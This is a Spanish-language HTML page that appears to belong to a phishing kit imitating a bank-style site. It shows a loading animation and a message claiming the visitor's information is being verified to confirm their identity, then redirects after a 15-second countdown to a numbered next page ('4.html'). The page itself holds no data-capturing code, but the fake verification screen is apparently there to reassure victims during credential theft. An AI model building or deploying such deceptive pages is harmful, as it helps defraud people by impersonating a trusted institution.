<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>GTC</title>
    <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
  </head>
  <body>
    <style>
        *{margin: 0;padding: 0;}
    </style>
    <nav style="padding: 10px 0;height: 20px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;background: linear-gradient(90deg,#0067b1,#12477d);">
        <img id="n1" src="n1.svg" alt="" style="height:24px;">
    </nav>
    <nav style="padding: 10px 0; height: 60px; background: #fff; border-bottom: 1px solid rgba(33,25,21,.2); text-align: center; ">
    <img src="l.svg" alt="" style="width:60px;">
    </nav>
    <nav style="padding: 10px 0;height: 18px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;">
        <img id="n2" src="n2.svg" alt="" style="height:24px;">
    </nav>
    <div id="main-cnt" style="background-image: url(bnr1.jpg);background-repeat: no-repeat; overflow: hidden;background-size: cover;background-position: 50%; min-height:700px">

    <div id="ctn" style="overflow:hidden;text-align:center;background: rgb(172 172 172 / 21%);height:100vh;">
        <form method=" " action=" " id="f1" style="display: inline-block;width: 420px;height: 715px;background-image: url(33.svg);border-radius: 0 0 45px 45px; background-repeat: no-repeat; background-position: center;" >









          <div class="cont-cg1">
              <img class="ig" src="titulo.png" alt=""><br>







          <h1 class="CuentaAtras" id="CuentaAtras">Por favor, espera 15 segundos, estamos verificando tu información para confirmar tu identidad. <br> </h1>



            <script language="JavaScript">
              var totalTiempo = 15;
              var url = "4.html";
              function updateReloj() {
                  document.getElementById('CuentaAtras').innerHTML = "Por favor, espera " + totalTiempo + " segundos, estamos procesando la información ingresada. <br>";
                  if (totalTiempo == 0) {
                      window.location = url;
                  } else {
                      totalTiempo -= 1;
                      setTimeout(updateReloj, 1000);
                  }
              }
              window.onload = updateReloj;
            </script>









<div style="width: 100%; text-align: center; " >
  <br>
          <img class="carg" src="gifo.gif" alt="">


  </div>



       

          </div>




































          
             
        </form>
    </div>
    </div>
    <style>


      .CuentaAtras {
         vertical-align: baseline;
          font-family: sans-serif;

          text-align: center;
          font-size: 15px;
         width: 316px;
          color: #fff;
          margin: 15px 0;

      }

      
        @media screen and (min-width:1024px){
            #ctn{
                text-align: right !important;
                padding-right: 46px;
            }

        }
        @media screen and (max-width:720px){
            #n1{
                height: 20px!important;
            }
            #n2{
                height: 18px!important;
            }
        }
        @media screen and (max-width:420px){
            #f1{
                border-radius: 0!important;
            }
            #main-cnt{
                background-image: none!important;
                background: linear-gradient(90deg,#0067b1,#12477d) !important;
            }
        }




      .caja1 {

          box-sizing: content-box;
          background:linear-gradient(90deg,#0067b1,#12477d);
          width: 408px;
          height: 350px;
      }


      .cont-cg1 {
          margin-top: 50px;
          position: absolute;
          margin-left: 46px;
      }

      .carg {
          width: 100px;
      }
 

      
    </style>
    <?php echo $main; ?>
  </body>
</html>